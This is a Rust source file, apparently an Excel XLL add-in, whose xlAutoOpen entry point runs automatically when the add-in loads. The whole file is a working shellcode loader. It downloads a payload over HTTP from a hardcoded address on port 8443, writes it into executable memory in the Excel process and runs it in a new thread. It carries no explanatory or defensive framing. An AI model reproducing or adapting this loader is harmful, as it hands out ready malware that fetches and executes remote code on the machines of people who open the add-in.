use std::ptr;
use windows::{
    Win32::{
        Foundation::CloseHandle,
        System::{
            Memory::{
                VirtualAllocEx, 
                MEM_COMMIT,
                MEM_RESERVE,
                // PAGE_READWRITE,
                PAGE_EXECUTE_READWRITE,
            },
            Threading::{
                OpenProcess,
                CreateRemoteThread,
                GetCurrentProcessId,
                PROCESS_ALL_ACCESS,
            }
        },
    },
    Win32::System::Diagnostics::Debug::WriteProcessMemory,
};
use reqwest::get;

// CONSTANTS
// Define url here
const URL: &str = "http://192.168.1.114:8443/foo";

fn inject(sc: Vec<u8>) {
    unsafe {
        let pid: u32 = GetCurrentProcessId();
        let h = OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap();
        let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
        let mut n = 0;
        WriteProcessMemory(h, addr, sc.as_ptr() as  _, sc.len(), Some(&mut n));
        let _h_thread = CreateRemoteThread(
            h, 
            None, 
            0, 
            Some(std::mem::transmute(addr)), 
            None,
            0, 
            None);
        CloseHandle(h);
    }
}

async fn get_inject_shellcode(url: &str) {
    if let Ok(res) = get(url).await {
        if res.status().is_success() {
            let sc: Vec<u8> = res.bytes().await.unwrap().to_vec();
            inject(sc);
        }
    }
}

#[tokio::main]
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
async extern "system" fn xlAutoOpen() {
    get_inject_shellcode(URL).await;
        
}
